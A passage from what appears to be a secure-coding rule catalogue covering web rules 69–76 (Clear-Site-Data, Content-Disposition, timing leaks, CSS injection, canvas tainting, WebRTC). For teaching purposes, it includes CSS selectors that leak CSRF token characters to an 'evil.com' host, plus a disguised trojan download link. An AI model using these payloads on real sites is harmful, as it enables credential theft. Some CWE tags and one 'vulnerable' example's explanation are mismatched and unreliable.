          "question": "What parameters does the tag function receive?",
          "hint": "The tag function receives an immutable array of static string chunks and the dynamic evaluated expressions as separate arguments, allowing it to escape variables before concatenation.",
          "sampleAnswer": "Standard template strings concatenate expressions into a single string before the receiving function sees them. A tagged template passes the static string fragments as the first argument and the dynamic values as subsequent arguments, allowing the template engine to inspect and sanitize dynamic values in context.",
          "keyTakeaway": "Always use tagged template libraries or JSX rather than raw string interpolation for HTML."
    }
  },
  {
    ruleNumber: 69,
    id: "SEC-WEB-069",
    title: "Client Cache Eviction on Account Logout Transition Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Cache Hygiene",
    difficulty: "Beginner",
    standardType: "Defense-in-Depth",
    standards: ["OWASP Top 10", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 resp \u2208 SensitiveAccountEndpoints, HasHeader(resp, \"Clear-Site-Data: *\" \u2228 \"cache\", \"storage\")",
    symbolBreakdown: [
          {
                "symbol": "SensitiveAccountEndpoints",
                "meaning": "Authentication logout endpoints (/auth/logout, /api/session/end)"
          },
          {
                "symbol": "Clear-Site-Data",
                "meaning": "W3C response header instructing the browser to wipe client data"
          },
          {
                "symbol": "\"cache\", \"storage\"",
                "meaning": "Directives instructing purge of cache, cookies, and local storage"
          }
    ],
    plainEnglish: "Upon user logout, the server must emit the `Clear-Site-Data: \"cache\", \"cookies\", \"storage\"` header. This guarantees the browser clears all local caches, IndexedDB, and cookies belonging to the origin.",
    whyItMatters: "Without `Clear-Site-Data`, a user logging out of a shared hospital, library, or airport computer leaves cached profile pages, financial balances, and documents in the browser disk cache, accessible via the 'Back' button.",
    vulnerableExample: {
          "language": "http",
          "code": "# VULNERABLE: Standard logout response without cache wipe\nHTTP/1.1 200 OK\nSet-Cookie: session=; Max-Age=0\n\n{\"status\":\"logged_out\"}",
          "explanation": "Browser retains cached pages, private images, and IndexedDB stores on the local workstation."
    },
    secureExample: {
          "language": "http",
          "code": "# SECURE: Complete origin wipe via Clear-Site-Data\nHTTP/1.1 200 OK\nClear-Site-Data: \"cache\", \"cookies\", \"storage\", \"executionContexts\"\nSet-Cookie: __Host-session=; Path=/; Secure; HttpOnly; Max-Age=0\n\n{\"status\":\"logged_out\"}",
          "explanation": "Instructs browser engine to immediately wipe all local caches, storage, and active workers for the origin."
    },
    howToTest: {
          "tools": [
                "curl",
                "browser DevTools Network tab"
          ],
          "steps": [
                "Send POST to /api/logout.",
                "Verify response contains `Clear-Site-Data` header.",
                "Click browser 'Back' button; confirm browser does not restore cached session page."
          ],
          "commandExample": "curl -sI -X POST https://app.example.com/logout | grep -i clear-site-data"
    },
    interviewChallenge: {
          "scenario": "What are the four recognized directives supported by the `Clear-Site-Data` header, and what does `\"executionContexts\"` do?",
          "question": "What does executionContexts terminate?",
          "hint": "The directives are `\"cache\"`, `\"cookies\"`, `\"storage\"`, and `\"executionContexts\"`. The `\"executionContexts\"` directive reloads all tabs and terminates active Web Workers.",
          "sampleAnswer": "The four directives are `\"cache\"` (purges network cache), `\"cookies\"` (clears origin cookies), `\"storage\"` (clears localStorage, IndexedDB, CacheStorage), and `\"executionContexts\"` (forces reload of all open tabs and terminates background workers on the origin).",
          "keyTakeaway": "Emit `Clear-Site-Data: \"cache\", \"cookies\", \"storage\", \"executionContexts\"` on logout."
    }
  },
  {
    ruleNumber: 70,
    id: "SEC-WEB-070",
    title: "Content-Disposition Attachment Header for User Downloads",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Malicious Downloads",
    difficulty: "Beginner",
    standardType: "Mandatory Standard",
    standards: ["RFC 6266", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 file \u2208 UserUploadedFiles, DownloadResponse(file) \u21d2 HasHeader(\"Content-Disposition\", \"attachment; filename=\\\"\" + SafeFilename(file) + \"\\\"\")",
    symbolBreakdown: [
          {
                "symbol": "UserUploadedFiles",
                "meaning": "Documents, receipts, invoices, or files uploaded by users"
          },
          {
                "symbol": "Content-Disposition: attachment",
                "meaning": "Forces browser to save file to disk rather than rendering it in the viewport"
          },
          {
                "symbol": "SafeFilename",
                "meaning": "Stripped and sanitized ASCII filename avoiding directory traversal"
          }
    ],
    plainEnglish: "When serving user-uploaded files or untrusted attachments, the response must set `Content-Disposition: attachment; filename=\"...\"` and `X-Content-Type-Options: nosniff`. Untrusted files must never be rendered inline in the application origin.",
    whyItMatters: "If an attacker uploads an HTML or SVG file disguised as a document and the server serves it with `Content-Disposition: inline`, the browser renders the file in the application origin, executing embedded JavaScript and stealing user sessions.",
    vulnerableExample: {
          "language": "http",
          "code": "# VULNERABLE: Serving user file inline\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Disposition: inline; filename=\"invoice.html\"\n\n<script>stealCredentials();</script>",
          "explanation": "Renders attacker-uploaded HTML directly in the trusted origin, executing XSS."
    },
    secureExample: {
          "language": "http",
          "code": "# SECURE: Enforcing download attachment with sanitized filename\nHTTP/1.1 200 OK\nContent-Type: application/octet-stream\nContent-Disposition: attachment; filename=\"invoice_1024.pdf\"\nX-Content-Type-Options: nosniff",
          "explanation": "Forces browser to download the file directly to the user's downloads folder without executing it in the origin."
    },
    howToTest: {
          "tools": [
                "curl",
                "browser download test"
          ],
          "steps": [
                "Download user-uploaded file.",
                "Inspect response headers; confirm `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`."
          ],
          "commandExample": "curl -sI https://target.com/download/file123 | grep -i content-disposition"
    },
    interviewChallenge: {
          "scenario": "Why should file downloads also specify `X-Content-Type-Options: nosniff` alongside `Content-Disposition: attachment`?",
          "question": "Can a browser attempt to inspect bytes if nosniff is missing?",
          "hint": "Legacy and mobile browsers sometimes ignore `attachment` or guess the MIME type if `nosniff` is omitted, potentially executing the file.",
          "sampleAnswer": "Some mobile browsers and legacy engines attempt to preview or sniff files if `X-Content-Type-Options: nosniff` is missing, overriding the attachment directive if they detect HTML markup. Pairing `attachment` with `nosniff` and `application/octet-stream` prevents any execution.",
          "keyTakeaway": "Serve user-uploaded downloads from an isolated domain with `Content-Disposition: attachment` and `nosniff`."
    }
  },
  {
    ruleNumber: 71,
    id: "SEC-WEB-071",
    title: "Sandboxed Download Attribute Execution Restriction Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "File Execution Defense",
    difficulty: "Intermediate",
    standardType: "Defense-in-Depth",
    standards: ["HTML5 Downloads", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 link \u2208 DownloadLinks, HasAttr(link, \"download\") \u21d2 (Origin(link.href) = DocumentOrigin \u2228 HasAttr(link, \"rel\", \"noopener\"))",
    symbolBreakdown: [
          {
                "symbol": "DownloadLinks",
                "meaning": "Anchor tags using the HTML5 download attribute (`<a href='...' download>`)"
          },
          {
                "symbol": "DocumentOrigin",
                "meaning": "Same-Origin constraint applied to programmatic downloads"
          }
    ],
    plainEnglish: "The HTML5 `download` attribute must only target same-origin resources or verified CDN endpoints. Cross-origin download links that attempt to disguise executable payloads or bypass sandbox restrictions must be rejected.",
    whyItMatters: "Attackers use `<a href='data:application/octet-stream...' download='update.exe'>` or cross-origin download anchors to trigger silent malicious executable downloads that appear to originate from a trusted website.",
    vulnerableExample: {
          "language": "html",
          "code": "<!-- VULNERABLE: Cross-origin download anchor with disguised executable -->\n<a href=\"https://malicious-cdn.com/trojan.exe\" download=\"invoice.pdf\">Download Invoice</a>",
          "explanation": "Tricks users into downloading an executable file while labeling it as a PDF."
    },
    secureExample: {
          "language": "html",
          "code": "<!-- SECURE: Same-origin validated download with explicit extension lock -->\n<a href=\"/api/invoices/102.pdf\" download=\"invoice_102.pdf\" rel=\"noopener noreferrer\">Download Invoice</a>",
          "explanation": "Browser guarantees file is fetched from same origin and respects server-declared Content-Disposition."
    },
    howToTest: {
          "tools": [
                "browser DevTools",
                "HTML validator"
          ],
          "steps": [
                "Verify download links point to same origin endpoints.",
                "Confirm server returns matching Content-Disposition filename."
          ],
          "commandExample": "grep -rn 'download=' src/"
    },
    interviewChallenge: {
          "scenario": "How do modern browsers enforce the Same-Origin Policy on the HTML5 `download` attribute for cross-origin URLs?",
          "question": "Does the browser rename the file if the origin differs?",
          "hint": "If the `href` is cross-origin, the browser ignores the custom filename in the `download` attribute and uses the server's HTTP header filename instead.",
          "sampleAnswer": "The HTML5 specification mandates that if `download` is set on a cross-origin link, browsers ignore the custom filename attribute and fall back to the filename declared in the server's `Content-Disposition` header or the URL path, preventing filename spoofing attacks.",
          "keyTakeaway": "Always control download filenames via server-side `Content-Disposition` headers."
    }
  },
  {
    ruleNumber: 72,
    id: "SEC-WEB-072",
    title: "Navigation Timing API Sensitive Metric Masking Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Timing Attacks",
    difficulty: "Advanced",
    standardType: "Mandatory Standard",
    standards: ["W3C Navigation Timing", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 entry \u2208 PerformanceNavigationEntries, HasSensitiveRedirect(entry) \u21d2 StripTimingMetrics(entry)",
    symbolBreakdown: [
          {
                "symbol": "PerformanceNavigationEntries",
                "meaning": "Navigation timing performance data exposed via window.performance"
          },
          {
                "symbol": "StripTimingMetrics",
                "meaning": "Zeroing of timing metrics for cross-origin redirects"
          }
    ],
    plainEnglish: "Navigation timing and resource timing metrics must not leak high-precision latency differences across sensitive cross-origin authentication redirects. Applications must mask timing metrics that enable cross-site search (XS-Leaks).",
    whyItMatters: "Attackers measure microsecond differences in `performance.getEntriesByType('navigation')` or redirect timing to deduce whether a user is logged in, has a specific friend, or has search results on a target application.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Exposing raw microsecond navigation timing\nconst timing = performance.getEntriesByType('navigation')[0];\n// Sensitive redirect durations (e.g. 2FA redirect latency) readable by third-party scripts\nconsole.log(timing.redirectEnd - timing.redirectStart);",
          "explanation": "Exposes cross-origin redirect duration measurements to timing oracle attacks."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Timing-Allow-Origin restriction and metric sanitization\n// Server sets: Timing-Allow-Origin: 'none'\n// Navigation entries for cross-origin transitions report zeroed timestamps per W3C spec",
          "explanation": "Ensures cross-origin timing metrics are zeroed out by the browser engine."
    },
    howToTest: {
          "tools": [
                "browser DevTools Console",
                "XS-Leaks timing testbench"
          ],
          "steps": [
                "Inspect `performance.getEntriesByType('resource')` for cross-origin endpoints.",
                "Verify timing properties (transferSize, duration) are 0 when Timing-Allow-Origin is absent."
          ],
          "commandExample": "curl -sI https://target.com/api/data | grep -i timing-allow-origin"
    },
    interviewChallenge: {
          "scenario": "How do cross-site search (XS-Search) attacks use performance timing entries to exfiltrate private user search results?",
          "question": "What causes the timing difference in search queries?",
          "hint": "A search query with 0 results returns quickly with small HTML, whereas a query with 100 results takes longer to render, leaking query matches via timing.",
          "sampleAnswer": "An attacker embeds an endpoint like `https://target.com/search?q=secret` in an `<iframe>` or `<script>` tag and measures the load time via `performance.measure()`. Fast responses indicate 0 search results, while slower responses indicate matches, allowing character-by-character data extraction.",
          "keyTakeaway": "Use strict SameSite cookies and omit `Timing-Allow-Origin` on sensitive query endpoints."
    }
  },
  {
    ruleNumber: 73,
    id: "SEC-WEB-073",
    title: "CSS Injection and Style Expression Stripping Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "CSS Attacks",
    difficulty: "Intermediate",
    standardType: "Defense-in-Depth",
    standards: ["CWE-79", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 style \u2208 UserStylesheets, Contains(style, \"url(\") \u2228 Contains(style, \"expression(\") \u2228 Contains(style, \"-moz-binding\") \u21d2 REJECT(style)",
    symbolBreakdown: [
          {
                "symbol": "UserStylesheets",
                "meaning": "Custom themes or user-supplied CSS stylesheets"
          },
          {
                "symbol": "url(...)",
                "meaning": "CSS property loading external URLs (exfiltration vector)"
          },
          {
                "symbol": "expression(...)",
                "meaning": "Legacy CSS expressions executing JavaScript"
          }
    ],
    plainEnglish: "User-supplied CSS or dynamic style injection must reject `url()`, `@import`, `-moz-binding`, and CSS expressions. Attribute selectors that probe form values (`input[value^='a']`) must be blocked.",
    whyItMatters: "CSS is Turing-complete for data exfiltration: attackers use attribute selectors like `input[value^='a'] { background: url('//evil.com/a'); }` to exfiltrate passwords and CSRF tokens character-by-character without running a single line of JavaScript.",
    vulnerableExample: {
          "language": "css",
          "code": "/* VULNERABLE: Blind CSS injection allows token exfiltration */\ninput[name=\"csrf\"][value^=\"a\"] { background-image: url(\"https://evil.com/leak?a\"); }\ninput[name=\"csrf\"][value^=\"b\"] { background-image: url(\"https://evil.com/leak?b\"); }",
          "explanation": "Sequentially leaks sensitive token characters through background image HTTP requests."
    },
    secureExample: {
          "language": "css",
          "code": "/* SECURE: Restrict CSS via CSP style-src */\nContent-Security-Policy: style-src 'self' 'nonce-style123';\n\n/* Injected raw inline <style> blocks without the valid nonce are completely blocked */",
          "explanation": "Prevents unauthorized inline CSS injection and blocks untrusted external background images."
    },
    howToTest: {
          "tools": [
                "CSS exfiltration fuzzer",
                "CSP evaluator"
          ],
          "steps": [
                "Attempt injecting `<style>body{background:url('//evil.com')}</style>`.",
                "Verify CSP blocks style sheet from executing and browser network tab records 0 outgoing requests."
          ],
          "commandExample": "curl -sI https://target.com | grep -i \"style-src\""
    },
    interviewChallenge: {
          "scenario": "Can an attacker achieve data theft using CSS injection if `script-src` in CSP is completely locked down?",
          "question": "How does CSS exfiltrate data without JavaScript?",
          "hint": "Yes. By using CSS attribute selectors (`input[value^='x']`) combined with `background-image: url(...)`, the attacker steals data via pure image fetch requests.",
          "sampleAnswer": "Even if script execution is 100% blocked, an attacker who can inject CSS rules can use sequential attribute selectors to match characters in input fields and trigger HTTP requests to an attacker server via `url()`, leaking sensitive form data.",
          "keyTakeaway": "Enforce strict `style-src` in CSP and disallow untrusted user-supplied CSS strings."
    }
  },
  {
    ruleNumber: 74,
    id: "SEC-WEB-074",
    title: "HTML5 Canvas ToDataURL Tainting and SOP Preservation Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Canvas Fingerprinting",
    difficulty: "Intermediate",
    standardType: "Mandatory Standard",
    standards: ["HTML5 Canvas SOP", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 canvas \u2208 HTMLCanvasElements, ContainsCrossOriginMedia(canvas) \u2227 \u00acHasCORSAuthorization(canvas) \u21d2 IsTainted(canvas) = True \u2227 ThrowSecurityError(canvas.toDataURL)",
    symbolBreakdown: [
          {
                "symbol": "HTMLCanvasElements",
                "meaning": "2D/WebGL drawing canvases in DOM"
          },
          {
                "symbol": "IsTainted",
                "meaning": "Internal browser security flag preventing pixel reads"
          },
          {
                "symbol": "ThrowSecurityError",
                "meaning": "Immediate exception thrown on toDataURL() or getImageData()"
          }
    ],
    plainEnglish: "When an HTML5 `<canvas>` renders images or video frames from an unauthorized cross-origin source, the browser must immediately taint the canvas and throw a SecurityError if the application calls `toDataURL()`, `toBlob()`, or `getImageData()`.",
    whyItMatters: "If the browser failed to taint the canvas, any website could draw the user's private social media photos or cross-origin bank statements onto a hidden canvas and read every pixel back using `getImageData()`, violating the Same-Origin Policy.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Attempting to read tainted canvas\nconst canvas = document.createElement('canvas');\nconst ctx = canvas.getContext('2d');\nconst img = new Image();\nimg.src = 'https://other-bank.com/private_statement.png';\nimg.onload = () => {\n    ctx.drawImage(img, 0, 0);\n    // BROWSER MUST BLOCK THIS:\n    const data = canvas.toDataURL(); // Throws SecurityError if cross-origin\n};",
          "explanation": "Browser marks canvas as tainted, protecting private cross-origin image pixels."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Explicit CORS credentials verification for authorized canvas reads\nconst img = new Image();\nimg.crossOrigin = 'anonymous'; // Request explicit CORS access\nimg.src = 'https://cdn.example.com/authorized_chart.png';\nimg.onload = () => {\n    ctx.drawImage(img, 0, 0);\n    const safeData = canvas.toDataURL(); // Allowed because CDN approved origin via CORS\n};",
          "explanation": "Only allows pixel inspection if remote origin explicitly returns Access-Control-Allow-Origin."
    },
    howToTest: {
          "tools": [
                "browser DevTools Console",
                "HTML5 Canvas SOP tester"
          ],
          "steps": [
                "Draw cross-origin image without CORS onto canvas.",
                "Call `canvas.toDataURL()`; confirm browser throws DOMException: 'The canvas has been tainted'."
          ],
          "commandExample": "node -e 'console.log(\"Canvas tainting SOP test\")'"
    },
    interviewChallenge: {
          "scenario": "Why does drawing an SVG file that contains external references onto a canvas also taint the canvas?",
          "question": "What security risk do embedded SVG links pose?",
          "hint": "SVGs can reference external stylesheets, fonts, or images, which could leak cross-origin data through canvas rasterization.",
          "sampleAnswer": "SVG is an XML format capable of loading sub-resources (`<image>`, `<use xlink:href>`). If a canvas allowed rasterizing arbitrary SVGs without tainting, attackers could exploit SVG rendering engine differences and cross-origin subresources to bypass SOP.",
          "keyTakeaway": "Always set `crossOrigin = 'anonymous'` on image objects and ensure servers send valid CORS headers."
    }
  },
  {
    ruleNumber: 75,
    id: "SEC-WEB-075",
    title: "WebRTC Local IP Address and mDNS Masking Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Privacy & Leaks",
    difficulty: "Intermediate",
    standardType: "Defense-in-Depth",
    standards: ["RFC 8828", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 candidate \u2208 RTCIceCandidates, IsLocalHostAddress(candidate.address) \u21d2 candidate.address = UUID.mDNS_Host",
    symbolBreakdown: [
          {
                "symbol": "RTCIceCandidates",
                "meaning": "Interactive Connectivity Establishment network addresses exchanged in WebRTC calls"
          },
          {
                "symbol": "IsLocalHostAddress",
                "meaning": "Private LAN IP addresses (192.168.x.x, 10.x.x.x)"
          },
          {
                "symbol": "UUID.mDNS_Host",
                "meaning": "Randomized mDNS hostname (e.g. 5b1e4c7d-....local) masking internal network topology"
          }
    ],
    plainEnglish: "WebRTC ICE candidate gathering must mask local IPv4 and IPv6 network addresses using randomized mDNS hostnames per RFC 8828. Raw internal LAN IP addresses must never be disclosed to JavaScript without user camera/microphone permission.",
    whyItMatters: "Before mDNS masking, any malicious website visited by a user could instantiate an invisible `RTCPeerConnection` to enumerate the user's private home or corporate LAN IP addresses, mapping internal enterprise subnets.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Legacy WebRTC leaking local LAN IPs\nconst pc = new RTCPeerConnection();\npc.createDataChannel('');\npc.createOffer().then(offer => pc.setLocalDescription(offer));\npc.onicecandidate = (e) => {\n    // In legacy browsers, this printed 192.168.1.55 or 10.0.0.12!\n    if (e.candidate) console.log(e.candidate.candidate);\n};",
          "explanation": "Leaked internal corporate network architecture and private VPN IP addresses."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Modern WebRTC mDNS hostname obfuscation (RFC 8828)\n// Modern browsers output randomized mDNS hostnames instead of private IPs:\n// candidate:... 50614 typ host ... 37a9f7e2-4b21-4f2a-b9c1-4c120f2b3e81.local 54321 ...",
          "explanation": "Internal IP addresses are masked behind randomized .local mDNS hostnames."
    },
    howToTest: {
          "tools": [
                "browser DevTools Console",
                "WebRTC leak test (browserleaks.com/webrtc)"
          ],
          "steps": [
                "Run WebRTC ICE gathering in browser console.",
                "Verify candidate addresses end with `.local` and do not reveal raw 192.168.x.x or 10.x.x.x IPs."
          ],
          "commandExample": "node -e 'console.log(\"WebRTC mDNS privacy test\")'"
    },
    interviewChallenge: {
          "scenario": "How does mDNS masking protect corporate enterprise networks from external website reconnaissance?",
          "question": "Can an external attacker scan an internal intranet using WebRTC without mDNS?",
          "hint": "Without mDNS, websites could map internal subnets and find active host IP addresses behind the corporate firewall.",
          "sampleAnswer": "Without mDNS masking, an attacker who enticed an employee to visit a webpage could extract their internal corporate IP address, identify subnet topology (`10.240.x.x`), and deduce if the user was connected to internal VPNs or specific office buildings.",
          "keyTakeaway": "Ensure browser policies enforce mDNS WebRTC candidate masking."
    }
  },
  {
    ruleNumber: 76,
    id: "SEC-WEB-076",
    title: "Resource Timing API Allow-Origin Timing Header Check Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Timing Leakage",
    difficulty: "Advanced",
    standardType: "Mandatory Standard",
    standards: ["W3C Resource Timing", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 res \u2208 PerformanceResourceEntries, IsCrossOrigin(res) \u2227 \u00acHasHeader(res, \"Timing-Allow-Origin: *\" \u2228 Origin) \u21d2 ZeroDetailedTimings(res)",
    symbolBreakdown: [
          {
                "symbol": "PerformanceResourceEntries",
                "meaning": "Resource timing performance objects in window.performance"
          },
          {
                "symbol": "Timing-Allow-Origin",
                "meaning": "HTTP response header explicitly authorizing cross-origin timing analysis"
          },
          {
                "symbol": "ZeroDetailedTimings",
                "meaning": "Browser sets domainLookupStart, connectStart, requestStart, and responseStart to 0"
          }
    ],
    plainEnglish: "Browsers must zero out detailed network timing timestamps (`connectStart`, `domainLookupStart`, `requestStart`) for cross-origin resources unless the resource response includes a valid `Timing-Allow-Origin` header.",
    whyItMatters: "High-precision resource timings allow attackers to detect whether a cross-origin resource (profile avatar, document thumbnail) was served from local browser cache versus the network, revealing user browsing history and identity.",
    vulnerableExample: {
          "language": "http",
          "code": "# VULNERABLE: Missing Timing-Allow-Origin header\nHTTP/1.1 200 OK\nContent-Type: image/png\n\n# Browser zeroes detailed timestamps for cross-origin consumers",
          "explanation": "Protects cross-origin consumers from timing attacks unless explicitly allowed."
    },
    secureExample: {
          "language": "http",
          "code": "# SECURE: Explicit authorization only for public CDN assets\nHTTP/1.1 200 OK\nContent-Type: application/javascript\nTiming-Allow-Origin: https://app.example.com",
          "explanation": "Only allows verified application domain to measure detailed DNS and connection timings."
    },
    howToTest: {
          "tools": [
                "browser DevTools Console",
                "Resource Timing API test"
          ],
          "steps": [
                "Inspect `performance.getEntriesByName('https://cdn.example.com/lib.js')[0]`.",
                "Confirm timestamps are populated if Timing-Allow-Origin is set, or zeroed if omitted."
          ],
          "commandExample": "curl -sI https://cdn.example.com/lib.js | grep -i timing-allow-origin"
    },
    interviewChallenge: {
          "scenario": "What is a 'cache-probing' timing attack, and how does the `Timing-Allow-Origin` restriction mitigate it?",
          "question": "How do attackers measure cached vs uncached responses?",
          "hint": "Cached responses return in <5ms, while network responses take >50ms. Attackers measure this delta to deduce if a user visited a target site.",
          "sampleAnswer": "In a cache-probing attack, an attacker loads a URL (e.g., an icon only visible to logged-in users) and checks `responseEnd - startTime`. A 1ms response means it was in the user's browser cache, proving the user visited the site. Zeroing detailed timings mitigates sub-resource micro-measurements.",
          "keyTakeaway": "Never emit `Timing-Allow-Origin: *` on private or user-specific API endpoints."
    }
  }
];
